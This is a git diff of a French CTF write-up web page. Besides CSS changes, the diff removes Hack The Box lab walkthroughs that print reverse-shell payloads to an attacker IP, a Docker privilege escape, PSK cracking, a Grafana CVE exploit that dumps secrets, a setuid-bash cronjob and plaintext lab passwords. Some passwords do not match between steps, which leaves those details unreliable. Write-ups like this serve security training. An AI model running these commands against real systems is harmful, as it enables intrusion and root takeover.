@@ -2,195 +2,222 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Fr3nch4Sec - Writeups CTF</title>
 
-  <!-- Marked.js -->
   <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-
-  <!-- Highlight.js -->
   <link id="highlight-theme" rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <link rel="stylesheet" href="style/style.css">
 
-  <!-- Inline CSS -->
   <style>
-:root{
-  --bg-dark: #071025;
-  --bg-overlay: rgba(5,8,12,0.55);
-  --text-dark: #dbefff;
-  --accent1: #6ef0d3; /* turquoise */
-  --accent2: #b16bff; /* violet */
-  --code-bg-dark: #0b1116;
-  --code-green: #4cffb6;
-  --code-pink: #ff7ab6;
+    body {
+      background-image: url('https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1920&auto=format&fit=crop');
+      background-size: cover;
+      background-attachment: fixed;
+      overflow-x: hidden;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
+    body.dark-mode::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0.65), rgba(2,6,12,0.85));
+      z-index: -2;
+    }
+    body.light-mode::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(232,236,239,0.2), rgba(245,247,250,0.4));
+      z-index: -2;
+    }
+    main {
+      position: relative;
+      z-index: 2;
+      max-width: 1100px;
+      margin: 0 auto;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      backdrop-filter: blur(2px);
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    body.light-mode main {
+      background: linear-gradient(180deg, rgba(232,236,239,0.6), rgba(245,247,250,0.7));
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    header h1 { margin: 0 0 6px; font-size: 2rem; color: var(--accent1, #6ef0d3); }
+    header p  { margin: 0 0 16px; color: rgba(219,239,255,0.9); }
 
-  --bg-light: #e8ecef;         /* Gris bleuté doux, moins blanc */
-  --text-light: #2c3e50;       /* Anthracite doux */
-  --accent1-light: #5dade2;    /* Turquoise pastel atténué */
-  --accent2-light: #bb8fce;    /* Violet pastel (moins saturé) */
-  --code-bg-light: #f1f3f4;    /* Gris crème très clair */
-  --code-blue: #3498db;        /* Bleu doux (moins vif) */
-}
-
-/* Global */
-html,body{height:100%;margin:0;padding:0;font-family:Inter, Arial, sans-serif;background:var(--bg-dark);color:var(--text-dark);}
-body{
-  padding:30px;
-  box-sizing:border-box;
-  transition:background .25s,color .25s;
-  background-image: url('https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1920&auto=format&fit=crop');
-  background-size:cover;
-  background-attachment: fixed;
-  overflow-x: hidden;
-}
-/* Overlay sombre pour dark mode */
-body.dark-mode::before{
-  content:"";
-  position:fixed;
-  inset:0;
-  background:linear-gradient(180deg, rgba(0,0,0,0.65), rgba(2,6,12,0.85));
-  z-index:-2;
-}
-/* Overlay clair pour light mode (ultra-transparent pour voir l'image) */
-body.light-mode::before{
-  content:"";
-  position:fixed;
-  inset:0;
-  background:linear-gradient(180deg, rgba(232,236,239,0.2), rgba(245,247,250,0.4)); /* Très transparent : image visible ! */
-  z-index:-2;
-}
-
-/* main container */
-main{
-  position:relative;
-  z-index:2;
-  max-width:1100px;
-  margin:0 auto;
-  background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-  backdrop-filter: blur(2px);
-  padding:20px;
-  border-radius:12px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.5);
-}
-body.light-mode main {
-  background: linear-gradient(180deg, rgba(232,236,239,0.6), rgba(245,247,250,0.7)); /* Overlay image visible, moins blanc */
-  box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-}
-
-header h1{margin:0 0 6px;font-size:2rem;color:var(--accent1)}
-header p{margin:0 0 16px;color:rgba(219,239,255,0.9)}
-
-    /* Theme toggle */
-    .theme-toggle{
-      position:fixed;right:18px;top:18px;padding:8px 12px;border-radius:10px;border:0;cursor:pointer;
-      background:linear-gradient(90deg,#1e90ff,#8a2be2);color:#fff;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.35);
-      z-index:9999;
+    .theme-toggle {
+      position: fixed; right: 18px; top: 18px;
+      padding: 8px 12px; border-radius: 10px; border: 0; cursor: pointer;
+      background: linear-gradient(90deg,#1e90ff,#8a2be2); color: #fff;
+      font-weight: 700; box-shadow: 0 6px 18px rgba(0,0,0,0.35); z-index: 9999;
     }
     body.light-mode .theme-toggle {
-      background: linear-gradient(90deg, #5dade2, #bb8fce); /* Accents pastel pour bouton */
+      background: linear-gradient(90deg, #5dade2, #bb8fce);
     }
 
-    /* Sections & cards */
-    .platform-section{
-      margin-bottom:26px;padding:14px;border-radius:10px;background:var(--bg-overlay);
-      border:1px solid rgba(255,255,255,0.03);
+    /* Filtres plateforme */
+    .filters {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 20px;
+    }
+    .filter-btn {
+      padding: 6px 16px;
+      border-radius: 20px;
+      border: 1px solid rgba(110,240,211,0.3);
+      background: transparent;
+      color: rgba(219,239,255,0.7);
+      font-size: 13px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .filter-btn:hover,
+    .filter-btn.active {
+      background: rgba(110,240,211,0.12);
+      border-color: rgba(110,240,211,0.6);
+      color: #6ef0d3;
+    }
+    body.light-mode .filter-btn {
+      border-color: rgba(93,173,226,0.4);
+      color: #5dade2;
+    }
+    body.light-mode .filter-btn:hover,
+    body.light-mode .filter-btn.active {
+      background: rgba(93,173,226,0.1);
+      border-color: #5dade2;
+    }
+
+    /* Sections par plateforme */
+    .platform-section {
+      margin-bottom: 26px; padding: 14px; border-radius: 10px;
+      background: rgba(5,8,12,0.55);
+      border: 1px solid rgba(255,255,255,0.03);
     }
     body.light-mode .platform-section {
-      background: #f5f7fa; /* Crème grisâtre doux, moins blanc */
+      background: #f5f7fa;
       border: 1px solid #e9ecef;
     }
-    .platform-section h2{margin:0 0 12px;color:var(--accent2);text-shadow:0 2px 6px rgba(177,107,255,0.06)}
-    body.light-mode .platform-section h2 {
-      color: var(--accent1-light); /* Turquoise pastel */
+    .platform-section h2 {
+      margin: 0 0 12px;
+      color: #b16bff;
+      text-shadow: 0 2px 6px rgba(177,107,255,0.06);
     }
-    .writeup-item{
-      margin:12px 0;padding:12px;border-radius:10px;
-      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      border:1px solid rgba(255,255,255,0.03);
+    body.light-mode .platform-section h2 { color: #5dade2; }
+
+    /* Cards writeup */
+    .writeup-item {
+      margin: 12px 0; padding: 12px; border-radius: 10px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border: 1px solid rgba(255,255,255,0.03);
     }
     body.light-mode .writeup-item {
       background: #f5f7fa;
       border: 1px solid #e9ecef;
     }
-    .writeup-item h3{margin:0;font-size:1.05rem}
-    .clickable{
-      cursor:pointer;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      padding-right:28px;
-      user-select:none;
-      pointer-events:auto;
-    }
-    body.light-mode .clickable .title-text {
-      color: var(--accent2-light); /* Violet pastel */
-    }
-    .clickable .title-text{color:var(--accent1);font-weight:600}
-    .clickable::after{content:'+';font-size:1.25rem;font-weight:700;position:absolute;right:16px;top:50%;transform:translateY(-50%);transition:transform .2s}
-    .clickable.open::after{content:'−';transform:translateY(-50%) rotate(180deg)}
+    .writeup-item h3 { margin: 0; font-size: 1.05rem; position: relative; }
 
-    /* Accordion content */
-    .writeup-content{
-      height:0;
-      overflow:hidden;
-      padding:0 8px;
-      transition:height 0.45s ease, padding 0.25s ease;
-      will-change: height;
+    .clickable {
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-right: 28px;
+      user-select: none;
     }
-    .writeup-content.open{
-      padding:12px 8px;
-      height: auto;
+    .clickable .title-text { color: #6ef0d3; font-weight: 600; }
+    body.light-mode .clickable .title-text { color: #bb8fce; }
+
+    .clickable::after {
+      content: '+'; font-size: 1.25rem; font-weight: 700;
+      position: absolute; right: 16px; top: 50%;
+      transform: translateY(-50%); transition: transform 0.2s;
     }
-    body.light-mode .writeup-content {
-      background: #f5f7fa; /* Crème pour contenu */
-      border: 1px solid #e9ecef;
+    .clickable.open::after { content: '−'; transform: translateY(-50%) rotate(180deg); }
+
+    /* Badge difficulté */
+    .diff-badge {
+      font-size: 11px; font-weight: 600; padding: 2px 8px;
+      border-radius: 4px; margin-left: 10px; letter-spacing: 0.05em;
+      text-transform: uppercase; flex-shrink: 0;
+    }
+    .diff-easy   { background: rgba(57,224,110,.12); color: #39e06e; border: 1px solid rgba(57,224,110,.3); }
+    .diff-medium { background: rgba(224,176,57,.12); color: #e0b039; border: 1px solid rgba(224,176,57,.3); }
+    .diff-hard   { background: rgba(224,99,57,.12);  color: #e06339; border: 1px solid rgba(224,99,57,.3);  }
+    .diff-insane { background: rgba(192,57,224,.12); color: #c039e0; border: 1px solid rgba(192,57,224,.3); }
+
+    /* Contenu accordéon */
+    .writeup-content {
+      height: 0; overflow: hidden;
+      padding: 0 8px;
+      transition: height 0.45s ease, padding 0.25s ease;
+    }
+    .writeup-content.open { padding: 12px 8px; height: auto; }
+
+    /* Markdown dans l'accordéon */
+    .writeup-content h1,.writeup-content h2,.writeup-content h3 { color: #b16bff; margin-top: 8px; }
+    body.light-mode .writeup-content h1,
+    body.light-mode .writeup-content h2,
+    body.light-mode .writeup-content h3 { color: #5dade2; }
+    .writeup-content p  { margin: 8px 0; }
+    .writeup-content ul { margin: 8px 0 8px 20px; }
+    .writeup-content pre {
+      background: #0b1116; color: #4cffb6;
+      padding: 12px; border-radius: 8px; overflow: auto; margin: 10px 0;
+      white-space: pre-wrap; font-family: "Hack", monospace; font-size: 0.95rem;
+      border: 1px solid rgba(0,255,182,0.06); max-height: none;
+    }
+    body.light-mode .writeup-content pre { background: #f1f3f4; color: #3498db; border: 1px solid #dee2e6; }
+    .writeup-content code { background: rgba(255,255,255,0.03); padding: 2px 6px; border-radius: 4px; }
+    body.light-mode .writeup-content code { background: rgba(233,236,239,0.5); }
+    .writeup-content table { width: 100%; border-collapse: collapse; margin: 10px 0; }
+    .writeup-content th,.writeup-content td {
+      padding: 6px 8px; text-align: left;
+      border-bottom: 1px solid rgba(255,255,255,0.06); word-break: break-word;
+    }
+    body.light-mode .writeup-content th,
+    body.light-mode .writeup-content td { border-bottom: 1px solid #e9ecef; }
+    .writeup-content img { max-width: 100%; border-radius: 8px; margin: 10px 0; display: block; }
+    .writeup-content blockquote {
+      border-left: 3px solid #6ef0d3; padding: 4px 12px; margin: 8px 0;
+      background: rgba(110,240,211,0.05); border-radius: 0 6px 6px 0;
+      color: rgba(219,239,255,0.75);
+    }
+    body.light-mode .writeup-content blockquote {
+      border-left-color: #5dade2;
+      background: rgba(93,173,226,0.05);
+      color: #5a7a9a;
     }
 
-    /* Markdown styling */
-    .writeup-content h1,.writeup-content h2,.writeup-content h3{color:var(--accent2);margin-top:8px}
-    .writeup-content p{margin:8px 0;color:inherit}
-    .writeup-content ul{margin:8px 0 8px 20px}
-    .writeup-content pre{
-      background:var(--code-bg-dark);
-      color:var(--code-green);
-      padding:12px;border-radius:8px;overflow:auto;margin:10px 0;
-      white-space:pre-wrap;font-family:"Hack", monospace;font-size:0.95rem;border:1px solid rgba(0,255,182,0.06);
-      max-height: none;
-    }
-    body.light-mode .writeup-content pre {
-      background: var(--code-bg-light); /* Gris crème */
-      color: var(--code-blue); /* Bleu doux */
-      border: 1px solid #dee2e6;
-    }
-    .writeup-content code{background:rgba(255,255,255,0.03);padding:2px 6px;border-radius:4px}
-    body.light-mode .writeup-content code {
-      background: rgba(233,236,239,0.5); /* Gris crème pour inline code */
+    /* Loader */
+    .loader {
+      text-align: center; padding: 8px;
+      color: rgba(219,239,255,0.4);
+      font-size: 13px; font-style: italic;
     }
 
-    .writeup-content table{width:100%;table-layout:auto;border-collapse:collapse;margin:10px 0}
-    .writeup-content th,.writeup-content td{padding:6px 8px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03);word-break:break-word}
+    /* Etat vide */
+    .platform-section:empty { display: none; }
 
-    .writeup-content img{max-width:100%;height:auto;border-radius:8px;margin:10px 0;display:block}
+    /* Footer */
+    footer { text-align: center; padding: 20px; margin-top: 40px; opacity: 0.7; }
 
-    /* Light mode overrides - COULEURS ADOUCIES */
-    body.light-mode {
-      background: var(--bg-light); /* Gris bleuté doux */
-      color: var(--text-light);
-    }
-
-    /* Responsive */
-    @media (max-width:700px){
-      body{padding:18px}
-      .theme-toggle{right:12px;top:12px;padding:6px 10px}
-      header h1{font-size:1.4rem}
-      .writeup-item { margin-bottom: 25px; }
+    @media (max-width: 600px) {
+      body { padding: 18px; }
+      header h1 { font-size: 1.4rem; }
+      .theme-toggle { right: 12px; top: 12px; padding: 6px 10px; }
     }
   </style>
 </head>
 
-<body>
-  <!-- Theme toggle -->
+<body class="dark-mode">
   <button id="theme-toggle" class="theme-toggle" aria-label="Basculer thème">
     <span class="theme-icon">🌙</span>
   </button>
@@ -198,911 +225,199 @@ header p{margin:0 0 16px;color:rgba(219,239,255,0.9)}
   <main>
     <header>
       <h1>📂 Writeups CTF</h1>
-      <p>Voici mes writeups organisés par plateforme :</p>
+      <p>Organisés par plateforme — cliquer pour lire</p>
     </header>
 
-    <div id="writeupList">
-      <!-- HTB -->
-      <section class="platform-section">
-        <h2>Hack The Box</h2>
-
-
-		<article class="writeup-item">
-  <h3 class="clickable"><span class="title-text">Kobold - Easy</span></h3>
-  <div class="writeup-content" aria-hidden="true">
-    <script type="text/markdown">
-
-# HTB — Kobold · Linux · Easy
-
-**IP :** `10.129.245.50` &nbsp;|&nbsp; **Date :** 25 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · rustscan · ffuf · nuclei · curl · netcat · docker
-
----
-
-## Contexte
-
-> Kobold est une machine Linux de difficulté **Easy** sur HackTheBox.
-> L'accès initial repose sur une **RCE non authentifiée** dans MCPJam Inspector v1.4.2,
-> et l'escalade de privilèges exploite l'appartenance au groupe **docker** pour s'échapper du container et lire le flag root.
-
----
-
-## Reconnaissance
-
-### Scan de ports
-
-```bash
-rustscan -a 10.129.245.50 -u 5000
-```
-
-Rustscan repère seulement 22, 80 et 443. Le scan complet nmap révèle un quatrième port :
-
-```bash
-nmap -sC -sV -p- -O 10.129.245.50
-```
-
-```
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu-3ubuntu13.15
-80/tcp   open  http     nginx 1.24.0
-443/tcp  open  https    nginx 1.24.0
-3552/tcp open  http     Golang net/http server
-```
-
-Le port **3552** est identifié comme `taserver` par nmap — c'est un faux positif. En réalité, c'est une webapp Go avec un frontend SvelteKit. C'est le vrai point d'entrée. À retenir : toujours faire un `-p-`, rustscan ne suffit pas.
-
-### Scan passif (nuclei)
-
-```bash
-nuclei -target http://kobold.htb
-```
-
-Résultats notables : nginx 1.24.0 en fin de vie, en-têtes de sécurité absents (CSP, HSTS, X-Frame-Options). Aucune CVE directement exploitable côté HTTP.
-
-### Virtual Host Fuzzing
-
-```bash
-ffuf -c -u https://kobold.htb \
-     -H "Host: FUZZ.kobold.htb" \
-     -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-     -fc 302,403,404 -k
-```
-
-```
-mcp   [Status: 200, Size: 466]
-bin   [Status: 200, Size: 24402]
-```
-
-Deux sous-domaines découverts :
-
-- `mcp.kobold.htb` → **MCPJam Inspector v1.4.2** — le point d'entrée principal
-- `bin.kobold.htb` → PrivateBin — intéressant pour la post-exploitation, pas pour l'accès initial
-
-```bash
-echo "10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
-```
-
-### Fuzzing de l'API (port 3552)
-
-```bash
-ffuf -u http://kobold.htb:3552/FUZZ \
-     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-     -c -fc 200
-```
-
-```
-api/docs/          [Status: 301]
-api/events         [Status: 401]
-api/users/current  [Status: 401]
-api/users/login    [Status: 401]
-```
-
-Les endpoints existent mais nécessitent une auth. L'accès initial passera par MCPJam, pas par là.
-
----
-
-## Exploitation — RCE non authentifiée (CVE-2026-23744)
-
-**MCPJam Inspector** est un outil d'inspection de serveurs MCP (Model Context Protocol). La version 1.4.2 expose un endpoint `/api/mcp/connect` qui accepte une configuration de serveur arbitraire — y compris la commande à exécuter — **sans aucune authentification**.
-
-### Listener
-
-```bash
-nc -lvnp 4444
-```
-
-### Payload
-
-```bash
-curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-  -H "Content-Type: application/json" \
-  -d '{
-    "serverId": "pwn",
-    "serverConfig": {
-      "command": "bash",
-      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1"],
-      "env": {}
-    }
-  }'
-```
-
-Le serveur exécute la commande sans valider le champ `command`. Connexion obtenue immédiatement :
-
-```
-connect to [10.10.14.153] from (UNKNOWN) [10.129.245.50] 43680
-ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
-```
-
-### Stabilisation du shell
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm-256color
-export SHELL=/bin/bash
-stty rows $(tput lines) columns $(tput cols)
-```
-
-### Flag utilisateur
-
-```bash
-cat /home/ben/user.txt
-# user_flag{*********************}
-```
-
----
-
-## Escalade de privilèges — Docker Escape
-
-### Énumération des groupes
-
-```bash
-id
-# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
-```
-
-`ben` appartient au groupe **docker**. Un membre de ce groupe peut lancer des containers en mode privilégié, monter le système de fichiers hôte, et s'échapper complètement.
-
-```bash
-docker images
-# mysql                         latest    f66b7a288113
-# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
-```
-
-L'image `mysql:latest` est disponible localement. Pas besoin de pull.
-
-### Docker breakout
-
-```bash
-# Listener sur la machine d'attaque
-nc -lvnp 5555
-```
-
-```bash
-# Depuis le shell ben — monter le FS hôte et spawner un shell root
-docker run --rm --privileged -v /:/host-root mysql:latest \
-  /bin/bash -c 'chroot /host-root /bin/bash -i >& /dev/tcp/10.10.14.153/5555 0>&1'
-```
-
-Shell root obtenu dans le container. Le montage `/host-root` donne accès à tout le système hôte.
-
-### Lecture directe du flag root (méthode propre)
-
-```bash
-docker run --rm --privileged \
-  -v /:/hostfs \
-  --entrypoint cat mysql:latest \
-  /hostfs/root/root.txt
-# root_flag{*********************}
-```
-
----
-
-## Flags
-
-```
-user.txt  →  user_flag{*********************}
-root.txt  →  root_flag{*********************}
-```
-
----
-
-## Ce que j'ai retenu
-
-**Toujours scanner `-p-`.** Rustscan avait raté le port 3552 dans son scan rapide, et nmap l'avait mal identifié. Le vrai point d'entrée était là.
-
-**Le VHOST fuzzing est indispensable.** Le port 3552 semblait être la piste principale. Le vrai chemin était caché derrière `mcp.kobold.htb`, invisible sans fuzzing DNS.
-
-**Les outils de dev exposent souvent une RCE triviale.** MCPJam est conçu pour connecter des serveurs MCP en passant une commande — fonctionnalité légitime, mais catastrophique sans authentification.
-
-**`docker` dans les groupes = root.** L'appartenance à ce groupe est équivalente à sudo sans mot de passe. À checker systématiquement avec `id` dès qu'on a un shell.
-
----
-
-## Ressources
-
-- [MCPJam Inspector — GitHub](https://github.com/mcpjam/inspector)
-- [HackTricks — Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
-- [PortSwigger — Command Injection](https://portswigger.net/web-security/os-command-injection)
-
-    </script>
-  </div>
-</article>
-
-		  
-
-		<article class="writeup-item">
-  <h3 class="clickable"><span class="title-text">ExpressWay - Easy</span></h3>
-  <div class="writeup-content" aria-hidden="true">
-    <script type="text/markdown">
-
-# HTB — ExpressWay · Linux · Easy
-
-**IP :** `10.10.11.87` &nbsp;|&nbsp; **Outils :** nmap · udpx · ike-scan · psk-crack · ssh
-
----
-
-## Contexte
-
-> Machine atypique : la surface d'attaque principale n'est pas HTTP mais **UDP/500 (IKE)**. Le scan TCP classique ne révèle qu'un port SSH — tout se passe côté protocole IPsec.
-
----
-
-## Reconnaissance
-
-### Scan TCP
-
-```bash
-nmap -sC -sV -O 10.10.11.87
-```
-
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
-```
-
-Un seul port TCP ouvert. Pas de web, pas d'API. Il faut regarder ailleurs.
-
-### Scan UDP
-
-```bash
-nmap -Pn -sU -sV -T3 --top-ports 25 10.10.11.87
-```
-
-```
-69/udp   open          tftp   Netkit tftpd or atftpd
-500/udp  open          isakmp
-4500/udp open|filtered nat-t-ike
-```
-
-Le port **500/UDP (ISAKMP/IKE)** est ouvert. Ce protocole gère l'échange de clés pour les tunnels IPsec — inhabituel sur une machine CTF, et donc très intéressant.
-
-Confirmation avec udpx :
-
-```bash
-./udpx -t 10.10.11.87
-# 10.10.11.87:500 (ike)
-```
-
----
-
-## Exploitation
-
-### Récupération du handshake IKE
-
-```bash
-ike-scan -M -v 10.10.11.87
-```
-
-```
-10.10.11.87  Main Mode Handshake returned
-SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)
-VID=09002689dfd6b712 (XAUTH)
-```
-
-Le serveur répond en **PSK (Pre-Shared Key)**. En mode Aggressive, la clé est échangée en clair et peut être capturée :
-
-```bash
-ike-scan -A --pskcrack 10.10.11.87
-```
-
-```
-ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
-IKE PSK parameters (g_xr:g_xi:cky_r:...):
-d075f9b3786680...
-```
-
-Le hash PSK est récupéré avec l'identité `ike@expressway.htb`.
-
-### Crack du PSK
-
-```bash
-psk-crack -d /usr/share/wordlists/rockyou.txt psk.hash
-```
-
-```
-key "freakingrockstarontheroad" matches SHA1 hash 6145867...
-8045040 iterations in 5.034 seconds
-```
-
-Mot de passe trouvé en 5 secondes avec rockyou.
-
-### Connexion SSH
-
-```bash
-ssh ike@10.10.11.87
-# Password: lloveyou
-
-cat ~/user.txt
-# user_flag{**********************}
-```
-
----
-
-## Escalade de privilèges
-
-### Énumération
-
-```bash
-id
-# uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
-```
-
-Le groupe **proxy** donne accès aux logs Squid.
-
-```bash
-cat /var/log/squid/access.log.1 | grep offramp
-# TCP_DENIED/403 GET http://offramp.expressway.htb
-```
-
-L'URL `offramp.expressway.htb` apparaît dans les logs — c'est un indice. `sudo` accepte un paramètre `-h` (host) pour exécuter des commandes via un hôte distant :
-
-```bash
-/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
-```
-
-```
-root@expressway:/# cat /root/root.txt
-root_flag{**********************}
-```
-
----
-
-## Flags
-
-```
-user.txt  →  user_flag{**********************}
-root.txt  →  root_flag{**********************}
-```
-
----
-
-## Ce que j'ai retenu
-
-**Scanner UDP est indispensable.** Un scan TCP seul ne montre qu'un port SSH — la machine semblerait presque vide. Tout l'intérêt était sur le port 500/UDP.
-
-**IKE Aggressive Mode = PSK exposé.** En mode Aggressive, le handshake contient le hash de la Pre-Shared Key. Si le mot de passe est faible, `psk-crack` + rockyou le retrouve en quelques secondes.
-
-**`sudo -h` est une technique de privesc peu connue.** L'option `-h` permet d'indiquer un hôte pour l'exécution — exploitable quand un hôte interne fait confiance à la machine cible.
-
----
-
-## Ressources
-
-- [UDPx — GitHub](https://github.com/nullt3r/udpx)
-- [ike-scan — documentation](https://github.com/royhills/ike-scan)
-- [HackTricks — IKE / IPsec](https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting)
-
-    </script>
-  </div>
-</article>
-		  
-        <article class="writeup-item">
-  <h3 class="clickable"><span class="title-text">Planning - Easy</span></h3>
-  <div class="writeup-content" aria-hidden="true">
-    <script type="text/markdown">
-
-# HTB — Planning · Linux · Easy
-
-**IP :** `10.10.11.68` &nbsp;|&nbsp; **Outils :** nmap · nuclei · ffuf · gobuster · CVE-2024-9264 · ssh
-
-> **Credentials fournis au départ :** `admin / 0D5oT70Fq13EvB5r`
-
----
-
-## Contexte
-
-> La machine expose une instance **Grafana v11.0.0** vulnérable à une injection DuckDB (CVE-2024-9264). L'exploitation permet de lire des fichiers et d'exécuter des commandes, ce qui mène à des credentials SSH. L'escalade de privilèges passe par un cronjob accessible via un tunnel SSH.
-
----
-
-## Reconnaissance
-
-### Scan de ports
-
-```bash
-nmap -p- -sC -sV -O 10.10.11.68
-```
-
-```
-22/tcp  open  ssh    OpenSSH 9.6p1 Ubuntu
-80/tcp  open  http   nginx 1.24.0
-```
-
-Le port 80 redirige vers `http://planning.htb/`. On ajoute l'entrée dans `/etc/hosts`.
-
-### Virtual Host Fuzzing
-
-```bash
-ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' \
-     -u http://10.10.11.68 -fc 301
-```
-
-```
-grafana   [Status: 302, Size: 29]
-```
-
-Sous-domaine `grafana.planning.htb` découvert. On ajoute l'entrée dans `/etc/hosts`.
-
-### Identification de la version Grafana
-
-```bash
-curl -s "http://grafana.planning.htb/login" | grep -i version
-# "version":"11.0.0"
-```
-
-Grafana **v11.0.0** — vulnérable à CVE-2024-9264.
-
----
-
-## Exploitation — CVE-2024-9264 (Grafana DuckDB RCE)
-
-CVE-2024-9264 permet à un utilisateur authentifié d'injecter des requêtes DuckDB via le moteur de datasource, ce qui permet de **lire des fichiers arbitraires** et d'**exécuter des commandes système**.
-
-```bash
-git clone https://github.com/nollium/CVE-2024-9264.git
-cd CVE-2024-9264
-```
-
-### Lecture de fichiers
-
-```bash
-python3 CVE-2024-9264.py \
-  -u admin -p 0D5oT70Fq13EvB5r \
-  -f /etc/passwd \
-  http://grafana.planning.htb
-```
-
-```
-root:x:0:0:root:/root:/bin/bash
-...
-grafana:x:472:0::/home/grafana:/usr/sbin/nologin
-```
-
-### Extraction des variables d'environnement
-
-Le container Docker contient les credentials admin dans ses variables d'env :
-
-```bash
-python3 CVE-2024-9264.py \
-  -u admin -p 0D5oT70Fq13EvB5r \
-  -c "env" \
-  http://grafana.planning.htb
-```
-
-```
-GF_SECURITY_ADMIN_USER=enzo
-GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
-```
-
-### Connexion SSH
-
-```bash
-ssh enzo@10.10.11.68
-# Password: whoami!
-
-cat ~/user.txt
-# user_flag{*********************************}
-```
-
----
-
-## Escalade de privilèges
-
-### Découverte du crontab manager
-
-```bash
-netstat -tulnp
-# 127.0.0.1:8000   LISTEN
-```
-
-Un service tourne en local sur le port 8000. Exploration du système de fichiers :
-
-```bash
-cat /opt/crontabs/crontab.db
-```
-
-```json
-{"name":"Grafana backup","command":"...zip -P P4ssw0rdS0pRi0T3c ...","schedule":"@daily",...}
-```
-
-Le mot de passe `P4ssw0rdS0pRi0T3c` est en clair dans la base du crontab manager.
-
-### Tunnel SSH
-
-```bash
-ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
-```
-
-On accède à l'UI du crontab manager sur `http://127.0.0.1:8000` avec :
-
-```
-Login : root
-Password : P4ssw0rdS0pRi0T3c
-```
-
-### Injection de cronjob malveillant
-
-Dans l'interface web, on ajoute un nouveau job avec la commande :
-
-```bash
-cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
-```
-
-Après exécution du cronjob (fréquence : `* * * * *`) :
-
-```bash
-/tmp/rootbash -p
-
-rootbash-5.2# cat /root/root.txt
-# root_flag{*********************************}
-```
-
----
-
-## Flags
-
-```
-user.txt  →  user_flag{*********************************}
-root.txt  →  root_flag{*********************************}
-```
-
----
-
-## Ce que j'ai retenu
-
-**Les variables d'environnement Docker fuient souvent des secrets.** La commande `env` dans un container expose régulièrement des credentials en clair — à toujours tenter en cas de RCE dans un container.
-
-**Un tunnel SSH ouvre des services invisibles.** `netstat -tulnp` côté serveur révèle des ports internes inaccessibles depuis l'extérieur. Un tunnel SSH les rend accessibles localement en une commande.
-
-**Les fichiers de config contiennent des mots de passe en clair.** `/opt/crontabs/crontab.db` stockait le password root sans chiffrement. Explorer `/opt`, `/var`, et `/etc` après accès SSH est systématique.
-
----
-
-## Ressources
-
-- [CVE-2024-9264 — Exploit Python](https://github.com/nollium/CVE-2024-9264)
-- [Grafana Security Advisory](https://grafana.com/security/security-advisories/)
-- [HackTricks — Tunneling SSH](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
-
-    </script>
-  </div>
-</article>
-
-
-		  
-        <article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">Machine Basique</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
-# HackTheBox - Machine Basique
-
-... (contenu markdown) ...
-            </script>
-          </div>
-        </article>
-      </section>
-
-      <!-- TryHackMe -->
-      <section class="platform-section">
-        <h2>TryHackMe</h2>
-        <article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">WhiteRose - THM - Room Easy</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
-				
-# Recon
-
-Inscription dans nano, de l'ip avec l'url.
-```bash
-$ sudo nano /etc/hosts
-```
-
